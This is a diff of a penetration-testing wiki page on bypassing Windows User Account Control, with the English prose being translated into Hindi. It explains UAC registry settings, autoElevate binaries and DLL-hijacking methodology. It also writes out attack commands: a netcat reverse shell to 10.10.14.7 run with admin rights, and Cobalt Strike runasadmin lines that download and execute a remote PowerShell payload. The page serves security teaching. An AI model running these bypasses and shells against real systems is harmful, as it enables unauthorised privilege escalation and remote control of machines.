@@ -11,17 +11,17 @@ Get Access Today:
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक विशेषता है जो **उच्च गतिविधियों के लिए सहमति संकेत** सक्षम करती है। अनुप्रयोगों के विभिन्न `integrity` स्तर होते हैं, और एक **उच्च स्तर** वाला कार्यक्रम उन कार्यों को करने में सक्षम होता है जो **संभवतः सिस्टम को खतरे में डाल सकते हैं**। जब UAC सक्षम होता है, अनुप्रयोग और कार्य हमेशा **गैर-प्रशासक खाते के सुरक्षा संदर्भ में चलते हैं** जब तक कि एक प्रशासक स्पष्ट रूप से इन अनुप्रयोगों/कार्य को सिस्टम पर चलाने के लिए प्रशासक स्तर की पहुंच की अनुमति नहीं देता। यह एक सुविधा है जो प्रशासकों को अनपेक्षित परिवर्तनों से बचाती है लेकिन इसे सुरक्षा सीमा नहीं माना जाता है।
 
-For more info about integrity levels:
+अखंडता स्तरों के बारे में अधिक जानकारी के लिए:
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.
+जब UAC लागू होता है, एक प्रशासक उपयोगकर्ता को 2 टोकन दिए जाते हैं: एक मानक उपयोगकर्ता कुंजी, नियमित स्तर के रूप में नियमित क्रियाएँ करने के लिए, और एक प्रशासक विशेषाधिकार के साथ।
 
-This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
+यह [पृष्ठ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके पर गहराई से चर्चा करता है और लॉगिन प्रक्रिया, उपयोगकर्ता अनुभव, और UAC आर्किटेक्चर को शामिल करता है। प्रशासक सुरक्षा नीतियों का उपयोग करके स्थानीय स्तर पर (secpol.msc का उपयोग करके) या Active Directory डोमेन वातावरण में समूह नीति वस्तुओं (GPO) के माध्यम से कॉन्फ़िगर और धकेलकर UAC के काम करने के तरीके को अपने संगठन के लिए कॉन्फ़िगर कर सकते हैं। विभिन्न सेटिंग्स के बारे में विस्तार से चर्चा की गई है [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)। UAC के लिए सेट की जा सकने वाली 10 समूह नीति सेटिंग्स हैं। निम्नलिखित तालिका अतिरिक्त विवरण प्रदान करती है:
 
 | Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
@@ -38,94 +38,85 @@ This [page](https://docs.microsoft.com/en-us/windows/security/identity-protectio
 
 ### UAC Bypass Theory
 
-Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.
+कुछ कार्यक्रम **स्वचालित रूप से** **उच्च** स्तर पर **उपयोगकर्ता समूह** से संबंधित होने पर **स्वचालित रूप से** **उच्चीकृत** होते हैं। इन बाइनरी में उनके _**Manifests**_ के अंदर _**autoElevate**_ विकल्प का मान _**True**_ होता है। बाइनरी को **Microsoft द्वारा हस्ताक्षरित** होना चाहिए।
 
-Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.
+फिर, **UAC** को **बायपास** करने के लिए (उच्चीकृत करना **मध्यम** अखंडता स्तर से **उच्च** पर) कुछ हमलावर इस प्रकार की बाइनरी का उपयोग करते हैं ताकि वे **मनमाने कोड को निष्पादित** कर सकें क्योंकि इसे **उच्च स्तर की अखंडता प्रक्रिया** से निष्पादित किया जाएगा।
 
-You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).
+आप _**sigcheck.exe**_ उपकरण का उपयोग करके एक बाइनरी का _**Manifest**_ **चेक** कर सकते हैं। और आप _Process Explorer_ या _Process Monitor_ (Sysinternals के) का उपयोग करके प्रक्रियाओं के **अखंडता स्तर** को **देख** सकते हैं।
 
 ### Check UAC
 
-To confirm if UAC is enabled do:
-
+UAC सक्षम है या नहीं, इसकी पुष्टि करने के लिए करें:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    EnableLUA    REG_DWORD    0x1
+EnableLUA    REG_DWORD    0x1
 ```
+यदि यह **`1`** है तो UAC **सक्रिय** है, यदि यह **`0`** है या यह **मौजूद नहीं है**, तो UAC **निष्क्रिय** है।
 
-If it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.
-
-Then, check **which level** is configured:
-
+फिर, **कौन सा स्तर** कॉन्फ़िगर किया गया है, इसकी जांच करें:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
+- यदि **`0`** है, तो UAC प्रॉम्प्ट नहीं करेगा (जैसे **अक्षम**)
+- यदि **`1`** है, तो व्यवस्थापक से **उपयोगकर्ता नाम और पासवर्ड** पूछा जाएगा उच्च अधिकारों के साथ बाइनरी निष्पादित करने के लिए (सुरक्षित डेस्कटॉप पर)
+- यदि **`2`** है (**हमेशा मुझे सूचित करें**) UAC हमेशा व्यवस्थापक से पुष्टि मांगेगा जब वह उच्च विशेषाधिकारों के साथ कुछ निष्पादित करने की कोशिश करेगा (सुरक्षित डेस्कटॉप पर)
+- यदि **`3`** है, तो `1` की तरह लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं
+- यदि **`4`** है, तो `2` की तरह लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं
+- यदि **`5`** है (**डिफ़ॉल्ट**) तो यह व्यवस्थापक से पुष्टि मांगेगा कि उच्च विशेषाधिकारों के साथ गैर-विंडोज बाइनरी चलाने के लिए
 
-- If **`0`** then, UAC won't prompt (like **disabled**)
-- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
-- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
-- If **`3`** like `1` but not necessary on Secure Desktop
-- If **`4`** like `2` but not necessary on Secure Desktop
-- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
+फिर, आपको **`LocalAccountTokenFilterPolicy`** के मान पर ध्यान देना होगा\
+यदि मान **`0`** है, तो केवल **RID 500** उपयोगकर्ता (**बिल्ट-इन व्यवस्थापक**) UAC के बिना **व्यवस्थापक कार्य** कर सकता है, और यदि इसका `1` है, तो **"Administrators"** समूह के सभी खाते ऐसा कर सकते हैं।
 
-Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
-If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
+और, अंत में **`FilterAdministratorToken`** कुंजी के मान पर ध्यान दें\
+यदि **`0`** (डिफ़ॉल्ट) है, तो **बिल्ट-इन व्यवस्थापक खाता** दूरस्थ प्रशासन कार्य कर सकता है और यदि **`1`** है, तो बिल्ट-इन खाता व्यवस्थापक **दूरस्थ प्रशासन कार्य** नहीं कर सकता, जब तक `LocalAccountTokenFilterPolicy` को `1` पर सेट नहीं किया गया हो।
 
-And, finally take a look at the value of the key **`FilterAdministratorToken`**\
-If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.
+#### सारांश
 
-#### Summary
+- यदि `EnableLUA=0` या **मौजूद नहीं है**, **किसी के लिए भी UAC नहीं**
+- यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=1`**, किसी के लिए भी UAC नहीं
+- यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=0`, RID 500 (बिल्ट-इन व्यवस्थापक) के लिए कोई UAC नहीं**
+- यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=1`, सभी के लिए UAC**
 
-- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
+यह सभी जानकारी **metasploit** मॉड्यूल का उपयोग करके एकत्र की जा सकती है: `post/windows/gather/win_privs`
 
-All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`
-
-You can also check the groups of your user and get the integrity level:
-
+आप अपने उपयोगकर्ता के समूहों की भी जांच कर सकते हैं और अखंडता स्तर प्राप्त कर सकते हैं:
 ```
 net user %username%
 whoami /groups | findstr Level
 ```
-
-## UAC bypass
+## UAC बायपास
 
 > [!NOTE]
-> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears
+> ध्यान दें कि यदि आपके पास पीड़ित तक ग्राफिकल पहुंच है, तो UAC बायपास सीधा है क्योंकि आप बस UAC प्रॉम्प्ट दिखाई देने पर "हाँ" पर क्लिक कर सकते हैं
 
-The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
+UAC बायपास की आवश्यकता निम्नलिखित स्थिति में होती है: **UAC सक्रिय है, आपकी प्रक्रिया एक मध्यम अखंडता संदर्भ में चल रही है, और आपका उपयोगकर्ता प्रशासकों समूह में है**।
 
-It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**
+यह उल्लेख करना महत्वपूर्ण है कि **UAC को उच्चतम सुरक्षा स्तर (हमेशा) में बायपास करना बहुत कठिन है, बजाय इसके कि यह अन्य स्तरों (डिफ़ॉल्ट) में हो।**
 
-### UAC disabled
+### UAC निष्क्रिय
 
-If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
-
+यदि UAC पहले से ही निष्क्रिय है (`ConsentPromptBehaviorAdmin` **`0`**) तो आप **प्रशासक विशेषाधिकारों के साथ एक रिवर्स शेल निष्पादित कर सकते हैं** (उच्च अखंडता स्तर) कुछ इस तरह:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-
-#### UAC bypass with token duplication
+#### UAC बायपास टोकन डुप्लीकेशन के साथ
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Very** Basic UAC "bypass" (full file system access)
+### **बहुत** बुनियादी UAC "बायपास" (पूर्ण फ़ाइल प्रणाली पहुंच)
 
-If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).
+यदि आपके पास एक शेल है जिसमें एक उपयोगकर्ता है जो Administrators समूह के अंदर है, तो आप **C$** साझा को SMB (फ़ाइल प्रणाली) के माध्यम से एक नए डिस्क में स्थानीय रूप से **माउंट कर सकते हैं** और आपको **फ़ाइल प्रणाली के अंदर सब कुछ तक पहुंच प्राप्त होगी** (यहां तक कि Administrator का होम फ़ोल्डर)।
 
 > [!WARNING]
-> **Looks like this trick isn't working anymore**
-
+> **लगता है कि यह ट्रिक अब काम नहीं कर रही है**
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -133,11 +124,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
+### UAC बाईपास कोबाल्ट स्ट्राइक के साथ
 
-### UAC bypass with cobalt strike
-
-The Cobalt Strike techniques will only work if UAC is not set at it's max security level
-
+कोबाल्ट स्ट्राइक तकनीकें केवल तभी काम करेंगी जब UAC को इसके अधिकतम सुरक्षा स्तर पर सेट नहीं किया गया हो।
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -149,20 +138,18 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-
-**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
+**Empire** और **Metasploit** में **UAC** को **bypass** करने के लिए कई मॉड्यूल हैं।
 
 ### KRBUACBypass
 
-Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Documentation और tool [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) में है।
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables (like `Source\Akagi\outout\x64\Debug\Akagi.exe`) , you will need to know **which one you need.**\
-You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
+[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का **संकलन** है। ध्यान दें कि आपको **UACME को visual studio या msbuild का उपयोग करके संकलित** करना होगा। संकलन कई executables (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) बनाएगा, आपको यह जानना होगा कि **आपको कौन सा चाहिए।**\
+आपको **सावधान रहना चाहिए** क्योंकि कुछ bypasses **कुछ अन्य प्रोग्रामों को प्रॉम्प्ट** करेंगे जो **उपयोगकर्ता** को सूचित करेंगे कि कुछ हो रहा है।
 
-UACME has the **build version from which each technique started working**. You can search for a technique affecting your versions:
-
+UACME में **निर्माण संस्करण है जिससे प्रत्येक तकनीक काम करना शुरू हुई**। आप अपने संस्करणों को प्रभावित करने वाली तकनीक के लिए खोज कर सकते हैं:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -170,43 +157,42 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-
 Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
 
 #### More UAC bypass
 
-**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
+**सभी** तकनीकें जो यहाँ AUC को बायपास करने के लिए उपयोग की जाती हैं **एक पूर्ण इंटरैक्टिव शेल** की **आवश्यकता** होती है (एक सामान्य nc.exe शेल पर्याप्त नहीं है)।
 
-You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
+आप **meterpreter** सत्र का उपयोग करके प्राप्त कर सकते हैं। एक **प्रक्रिया** में माइग्रेट करें जिसका **सत्र** मान **1** के बराबर है:
 
 ![](<../../images/image (863).png>)
 
-(_explorer.exe_ should works)
+(_explorer.exe_ काम करना चाहिए)
 
 ### UAC Bypass with GUI
 
-If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.
+यदि आपके पास **GUI** तक पहुंच है, तो आप जब UAC प्रॉम्प्ट प्राप्त करते हैं, तो आप बस इसे स्वीकार कर सकते हैं, आपको वास्तव में इसे बायपास करने की आवश्यकता नहीं है। इसलिए, GUI तक पहुंच प्राप्त करना आपको UAC को बायपास करने की अनुमति देगा।
 
-Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
+इसके अलावा, यदि आप एक GUI सत्र प्राप्त करते हैं जिसका कोई और उपयोग कर रहा था (संभवतः RDP के माध्यम से), तो वहाँ **कुछ उपकरण हैं जो व्यवस्थापक के रूप में चल रहे होंगे** जहाँ से आप **cmd** को उदाहरण के लिए **व्यवस्थापक** के रूप में सीधे चला सकते हैं बिना UAC द्वारा फिर से प्रॉम्प्ट किए। जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **गुप्त** हो सकता है।
 
 ### Noisy brute-force UAC bypass
 
-If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.
+यदि आपको शोर करने की परवाह नहीं है, तो आप हमेशा **कुछ ऐसा चला सकते हैं** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जो **अनुमतियों को बढ़ाने के लिए पूछता है जब तक उपयोगकर्ता इसे स्वीकार नहीं करता**।
 
 ### Your own bypass - Basic UAC bypass methodology
 
-If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/).
+यदि आप **UACME** पर एक नज़र डालते हैं, तो आप देखेंगे कि **अधिकांश UAC बायपास एक Dll Hijacking कमजोरियों का दुरुपयोग करते हैं** (मुख्य रूप से _C:\Windows\System32_ पर दुर्भावनापूर्ण dll लिखना)। [Dll Hijacking कमजोरी खोजने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking/)।
 
-1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
-2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
-3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
-   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
-   2. **IFileOperation**: Windows 10.
-4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
+1. एक बाइनरी खोजें जो **autoelevate** करेगा (जाँच करें कि जब इसे निष्पादित किया जाता है, तो यह उच्च अखंडता स्तर पर चलता है)।
+2. procmon के साथ "**NAME NOT FOUND**" घटनाओं को खोजें जो **DLL Hijacking** के लिए कमजोर हो सकती हैं।
+3. आपको संभवतः कुछ **संरक्षित पथों** (जैसे C:\Windows\System32) के अंदर DLL **लिखने** की आवश्यकता होगी जहाँ आपके पास लिखने की अनुमति नहीं है। आप इसे बायपास कर सकते हैं:
+   1. **wusa.exe**: Windows 7, 8 और 8.1। यह संरक्षित पथों के अंदर CAB फ़ाइल की सामग्री को निकालने की अनुमति देता है (क्योंकि यह उपकरण उच्च अखंडता स्तर से निष्पादित होता है)।
+   2. **IFileOperation**: Windows 10।
+4. संरक्षित पथ के अंदर अपने DLL को कॉपी करने और कमजोर और ऑटोएलीवेटेड बाइनरी को निष्पादित करने के लिए एक **स्क्रिप्ट** तैयार करें।
 
 ### Another UAC bypass technique
 
-Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
+यह इस पर निर्भर करता है कि क्या एक **autoElevated binary** **पंजीकरण** से **नाम/पथ** को **पढ़ने** की कोशिश करता है एक **बाइनरी** या **कमांड** को **निष्पादित** करने के लिए (यह अधिक दिलचस्प है यदि बाइनरी इस जानकारी को **HKCU** के अंदर खोजता है)।
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
@@ -216,4 +202,3 @@ Get Access Today:
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
